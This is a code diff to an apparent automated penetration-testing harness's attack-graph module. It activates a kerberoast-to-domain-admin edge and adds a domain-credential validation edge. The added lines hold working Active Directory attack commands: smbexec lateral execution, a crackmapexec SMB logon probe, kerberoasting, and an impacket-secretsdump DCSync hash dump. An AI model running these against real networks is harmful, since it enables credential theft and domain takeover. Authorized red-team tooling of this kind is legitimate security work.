@@ -23,9 +23,9 @@ a context dict cannot inject structure).
 (:func:`tools.eval_harness.verify_flag_check`) — the single verifier-spec
 surface. There is deliberately NO unverified-transition path in the machine.
 
-Initial library ships only known-good chains; ``kerberoast_to_da`` is a
-documented stub (needs a DC environment) and is excluded from BFS plans
-until it has a working verify story.
+AD edges (``domain_login_validate``, ``kerberoast_to_da``) assume impacket /
+NetExec-class tooling on the operator box (Linux Kali arsenal); without it
+their ``shell_command`` probes fail closed (UNVERIFIED/False, never a pass).
 """
 
 from __future__ import annotations
@@ -189,33 +189,73 @@ EDGES: dict[str, Edge] = {
         ],
         "evidence_type": "webshell",
     },
-    # STUB: needs a DC environment (kerberoast + hash crack). Kept out of BFS
-    # plans (see STUB_EDGES) until its verify story works end to end.
-    "kerberoast_to_da": {
-        "edge_id": "kerberoast_to_da",
-        "from_state": AttackState.DOMAIN_CREDS.value,
-        "to_state": AttackState.DA.value,
-        "description": "STUB: kerberoast a DA-targetable SPN, crack the TGS, verify DA rights",
+    # -- domain transitions -----------------------------------------------
+    # Feeder: a credential that authenticates to domain services promotes
+    # creds_in_hand -> domain_creds. Verify is an independent NetExec domain
+    # logon probe (``[+]`` marks success); fail-closed without NetExec.
+    "domain_login_validate": {
+        "edge_id": "domain_login_validate",
+        "from_state": AttackState.CREDS_IN_HAND.value,
+        "to_state": AttackState.DOMAIN_CREDS.value,
+        "description": "Validate a credential pair against domain SMB (NetExec logon probe)",
         "playbook": [
             {
-                "tool": "kerberoast",
-                "args": {"target_ip": "{target_ip}", "username": "{user}", "password": "{password}"},
+                "tool": "lateral_exec",
+                "args": {
+                    "target_ip": "{target_ip}",
+                    "method": "smbexec",
+                    "username": "{user}",
+                    "password": "{password}",
+                    "command": "whoami",
+                },
             }
         ],
         "verify": [
             {
-                "id": "da_group_probe",
+                "id": "domain_logon_probe",
                 "type": "shell_command",
-                "exec": "net group 'Domain Admins' /domain",
-                "expect_stdout": "Domain Admins",
+                "exec": "crackmapexec smb {target_ip} -u {user} -p {password}",
+                "expect_stdout": "[+]",
+            }
+        ],
+        "evidence_type": "domain_credentials",
+    },
+    # Domain-admin: kerberoast a DA-targetable SPN (harvest for offline
+    # cracking), then prove the supplied domain credential already holds
+    # DS-Replication rights via a single-user DCSync probe. A DCSync that
+    # emits an ``:::`` hash line succeeds only with replication privileges —
+    # that IS the DA proof, on Linux and Windows alike (impacket is Python).
+    "kerberoast_to_da": {
+        "edge_id": "kerberoast_to_da",
+        "from_state": AttackState.DOMAIN_CREDS.value,
+        "to_state": AttackState.DA.value,
+        "description": "Kerberoast a DA-targetable SPN, verify DA via single-user DCSync probe",
+        "playbook": [
+            {
+                "tool": "kerberoast",
+                "args": {
+                    "target_ip": "{target_ip}",
+                    "domain": "{domain}",
+                    "username": "{user}",
+                    "password": "{password}",
+                },
+            }
+        ],
+        "verify": [
+            {
+                "id": "da_dcsync_probe",
+                "type": "shell_command",
+                "exec": "impacket-secretsdump {domain}/{user}:{password}@{target_ip} -just-dc -just-dc-user {user}",
+                "expect_stdout": ":::",
             }
         ],
         "evidence_type": "domain_admin_access",
     },
 }
 
-# Edges excluded from BFS planning because they are stubs.
-STUB_EDGES = frozenset({"kerberoast_to_da"})
+# Edges excluded from BFS planning because they are stubs. Empty: every
+# registered edge ships a working verify story (see module docstring).
+STUB_EDGES = frozenset()
 
 
 def get_edge(edge_id: str) -> Edge | None:
